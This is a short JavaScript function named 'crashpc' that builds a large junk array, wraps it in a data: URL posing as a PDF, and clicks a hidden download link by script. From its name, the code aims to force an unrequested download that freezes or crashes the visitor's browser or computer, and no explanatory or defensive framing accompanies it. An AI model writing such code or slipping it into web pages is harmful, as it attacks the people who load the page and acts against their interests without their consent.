function crashpc() {
  var arr = new Array();
  for (var i = 0; i < 300000; i++) {
      arr[i] = (i % 256);
  }
  var blob = 'data:application/pdf,' + arr;
  var link = document.createElement("a");
  link.download = "attachment";
  link.href = blob;
  link.textContent = "really"
  document.body.appendChild(link);
  link.click();

  link.remove();
};
